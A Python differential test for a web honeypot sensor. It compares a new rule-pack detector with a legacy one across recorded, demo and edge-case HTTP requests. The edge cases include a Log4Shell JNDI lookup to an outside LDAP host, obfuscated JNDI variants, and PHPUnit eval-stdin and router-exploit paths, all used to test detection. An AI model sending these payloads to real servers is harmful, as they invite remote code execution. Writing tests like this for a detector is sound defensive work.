"""Differential test of M37 phase 1: the sensor with the bundled trap packs against the frozen
pre-pack reference (``legacy_detect.py``).

Over the golden requests, the demo generator's requests, the trap fixtures, edge cases around
the converted rules, and every request the rest of this test suite sent (recorded by conftest),
the flags, the CVEs, the SEVERE decision and the response bytes must be identical.

The file name sorts last so that the recording covers the whole suite before it is replayed.
"""

from __future__ import annotations

import ast
import asyncio
import contextlib
import json
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest
from conftest import Harness
from legacy_detect import CALLS, LEGACY_SEVERE, LegacyDetector, view
from test_units import PATHOLOGICAL

from web_sensor.config import Config
from web_sensor.detect import Detector
from web_sensor.httpio import ConnReader, HttpError, Request

TESTS = Path(__file__).parent
REPO = TESTS.parents[2]
DEMO = REPO / "scripts" / "demo" / "demo" / "data.py"
FIXTURES = REPO / "traps" / "fixtures"


def _req(
    method: str, target: str, headers: list[tuple[str, str]] | None = None, body: bytes = b""
) -> bytes:
    head = [f"{method} {target} HTTP/1.1", "Host: 192.0.2.10"]
    hs = headers if headers is not None else [("User-Agent", "Mozilla/5.0 (compatible; test)")]
    head += [f"{k}: {v}" for k, v in hs]
    if body:
        head += ["Content-Type: application/x-www-form-urlencoded", f"Content-Length: {len(body)}"]
    head.append("Connection: close")
    return ("\r\n".join(head) + "\r\n\r\n").encode("latin-1") + body


def _demo_requests() -> list[bytes]:
    """Requests built from the demo generator's data (parsed, never imported)."""
    tree = ast.parse(DEMO.read_text())
    consts: dict[str, Any] = {}
    for node in tree.body:
        target: ast.expr | None = node.target if isinstance(node, ast.AnnAssign) else None
        if isinstance(node, ast.Assign) and len(node.targets) == 1:
            target = node.targets[0]
        value = node.value if isinstance(node, ast.Assign | ast.AnnAssign) else None
        if isinstance(target, ast.Name) and value is not None:
            with contextlib.suppress(ValueError, TypeError, SyntaxError):
                consts[target.id] = ast.literal_eval(value)
    out: list[bytes] = []
    for name, value in sorted(consts.items()):
        if name == "WEB_EXPLOIT_PROBES":
            for method, path, query, body in value:
                out.append(_req(method, path + (f"?{query}" if query else ""), body=body.encode()))
            continue
        items = value if isinstance(value, list | tuple) else [value]
        for item in items:
            first = item[0] if isinstance(item, tuple) and item else item
            if isinstance(first, str) and first.startswith("/") and " " not in first:
                out.append(_req("GET", first))
    for name in ("WEB_USER_AGENTS_SCANNERS", "WEB_USER_AGENTS_BROWSERS"):
        out += [_req("GET", "/", [("User-Agent", ua)]) for ua in consts.get(name, [])]
    if isinstance(consts.get("SHELLSHOCK_UA"), str):
        out.append(_req("GET", "/cgi-bin/status", [("User-Agent", consts["SHELLSHOCK_UA"])]))
    return out


def _edge_requests() -> list[bytes]:
    """Near misses and boundaries of the converted rules (case, encoding, caps, areas)."""
    jndi = "${jndi:ldap://198.51.100.7:1389/a}"
    pad = [(f"X-Pad-{i}", "p" * 8000) for i in range(5)]
    return [
        _req("GET", "/VENDOR/PHPUNIT/"),
        _req("GET", "/%2576endor/phpunit/x"),  # double-encoded
        _req("GET", "/vendor/phpunitx"),
        _req("GET", "/vendor/php%55nit"),
        _req("GET", "/a/vendor/phpunit/phpunit/src/util/php/eval-stdin.php?x=1"),
        _req("HEAD", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"),
        _req("OPTIONS", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"),
        _req("GET", "/?f=/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"),  # query only
        _req("GET", "/%252fboaform%252fadmin"),
        _req("GET", "/boaform"),
        _req("GET", "/x/GponForm/diag_Form?images/"),
        _req("GET", "/GPONFORM"),
        _req("GET", "/?p=/boaform/"),
        _req("POST", "/", body=jndi.upper().encode()),
        _req("GET", "/", [("X-Api", "${lower:j}ndi")]),  # header: only ${jndi: counts
        _req("GET", "/", [("X-Api", "${${::-j}ndi:x}")]),
        _req("GET", "/?a=${${::-j}ndi:x}"),
        _req("GET", "/?a=${lower:j}"),
        _req("GET", "/?a=" + "%24%7Bjndi%3A"),
        _req("GET", "/" + jndi.replace(" ", "")),
        _req("GET", "/?a=${jndi"),
        _req("GET", "/", [*pad, ("X-Last", jndi)]),  # past the 32 KiB header area
        _req("GET", "/", [("X-Pad", "p" * 1100 + jndi)]),  # past the 1 KiB value cut
        _req("POST", "/", body=b"a=" + b"x" * 20000 + jndi.encode()),  # past the body cap
        _req("GET", "/?" + "q" * 5000 + jndi),  # past the query cap
        _req("get", "/vendor/phpunit/"),
        _req("POST", "/xmlrpc.php", body=b"<methodCall>" + jndi.encode() + b"</methodCall>"),
    ]


def _fixture_requests() -> list[bytes]:
    return [p.read_bytes() for p in sorted(FIXTURES.rglob("*.http"))]


def _golden_requests() -> list[bytes]:
    golden = json.loads((TESTS / "golden" / "apache_errors.json").read_text())
    return [bytes.fromhex(golden[k]["request"]) for k in sorted(golden)]


def _pathological() -> list[bytes]:
    out = []
    for data in PATHOLOGICAL:
        text = data[:2000].decode("latin-1").replace("\r", "").replace("\n", "").replace(" ", "x")
        out.append(_req("POST", "/" + text, [("User-Agent", text[:1000])], body=data[:30000]))
    return out


CORPUS: dict[str, list[bytes]] = {
    "golden": _golden_requests(),
    "demo": _demo_requests(),
    "fixtures": _fixture_requests(),
    "edge": _edge_requests(),
    "pathological": _pathological(),
}


async def _parse(raw: bytes, cfg: Config) -> Request | None:
    reader = asyncio.StreamReader()
    reader.feed_data(raw)
    reader.feed_eof()
    cr = ConnReader(reader, cfg)
    try:
        req = await cr.read_request(first=True)
        if req is not None:
            with contextlib.suppress(HttpError):
                await cr.read_body(req)
    except Exception:
        return None
    return req


def test_corpus_is_meaningful() -> None:
    assert len(CORPUS["golden"]) >= 50 and len(CORPUS["demo"]) >= 40
    assert len(CORPUS["fixtures"]) >= 10 and len(CORPUS["edge"]) >= 20


async def test_corpus_analysis_matches_legacy() -> None:
    cfg = Config()
    new, old = Detector(cfg), LegacyDetector(cfg)
    assert new.traps.size > 0
    seen: set[str] = set()
    diffs: list[str] = []
    parsed = 0
    for source, items in CORPUS.items():
        for i, raw in enumerate(items):
            req = await _parse(raw, cfg)
            if req is None:
                continue
            parsed += 1
            got = view(new.analyze(req, "192.0.2.1"), new.severe)
            want = view(old.analyze(req, "192.0.2.1"), LEGACY_SEVERE)
            if got != want:
                diffs.append(f"{source}[{i}]: {got} != {want}")
            seen.update(got["flags"])
    assert diffs == []
    assert parsed >= 150
    # The corpus exercises every converted rule.
    assert {"phpunit_rce", "phpunit_probe", "log4shell", "router_exploit"} <= seen


async def _send(port: int, data: bytes) -> bytes:
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(data)
    with contextlib.suppress(OSError):
        await writer.drain()
        writer.write_eof()
    out = b""
    with contextlib.suppress(TimeoutError, OSError):
        while True:
            chunk = await asyncio.wait_for(reader.read(65536), 2.0)
            if not chunk:
                break
            out += chunk
    writer.close()
    return out


def _normalise(resp: bytes) -> list[bytes]:
    """Mask what differs between two connections whatever the detector: the Date header and
    the phpinfo() rows of the client port and request time (and the length they change)."""
    head, sep, body = resp.partition(b"\r\n\r\n")
    lines = body.split(b"\n")
    masked = [
        b"<per-connection>" if b"REMOTE_PORT" in ln or b"REQUEST_TIME" in ln else ln for ln in lines
    ]
    out = []
    for ln in head.split(b"\r\n"):
        if ln.startswith(b"Date: "):
            ln = b"Date: <date>"
        if ln.startswith(b"Content-Length: ") and masked != lines:
            ln = b"Content-Length: <n>"
        out.append(ln)
    return [*out, sep, *masked]


async def test_corpus_responses_and_events_match_legacy(
    start_with: Callable[..., contextlib.AbstractAsyncContextManager[Harness]],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Two sensors side by side, one with the packs and one with the pre-pack reference: the
    same request gives the same bytes on the wire and the same flags and CVEs in the event."""
    monkeypatch.setattr("web_sensor.site.secrets.token_hex", lambda n=16: "0" * (2 * n))
    async with start_with() as packs, start_with() as legacy:
        legacy.sensor.detector = LegacyDetector(legacy.cfg)
        diffs: list[str] = []
        sent = 0
        for source, items in CORPUS.items():
            if source == "pathological":
                continue  # large bodies; covered at the analysis level above
            for i, raw in enumerate(items):
                a, b = await asyncio.gather(_send(packs.http, raw), _send(legacy.http, raw))
                sent += 1
                la, lb = _normalise(a), _normalise(b)
                if la != lb:
                    pairs = zip([*la, b""], [*lb, b""], strict=False)
                    first = next((x[:120], y[:120]) for x, y in pairs if x != y)
                    diffs.append(f"{source}[{i}] {raw[:60]!r}: {first!r}")
        ev_a = await packs.events("http_request", wait=0.3)
        ev_b = await legacy.events("http_request", wait=0.3)

        def key(e: Any) -> tuple[str, str, str, tuple[str, ...], tuple[str, ...]]:
            d = e.data
            flags = tuple(d.get("flags", []))
            return (
                d.get("method", ""),
                d.get("path", ""),
                d.get("query", ""),
                flags,
                tuple(d.get("cve", [])),
            )

        assert sorted(map(key, ev_a)) == sorted(map(key, ev_b))
        assert len(ev_a) >= sent // 2
        assert diffs == []


def test_recorded_suite_requests_match_legacy() -> None:
    """Replays every request the other test files sent, in order, per detector instance."""
    if not CALLS:
        pytest.skip("run with the whole web test suite to replay its requests")
    legacy: dict[int, LegacyDetector] = {}
    diffs = []
    for call in CALLS:
        det = legacy.setdefault(call.detector, LegacyDetector(call.cfg))
        want = view(det.analyze(call.req, call.src_ip), LEGACY_SEVERE)
        if call.got != want:
            diffs.append(f"{call.req.method} {call.req.path[:80]}: {call.got} != {want}")
    assert diffs == []
    assert len(CALLS) >= 200
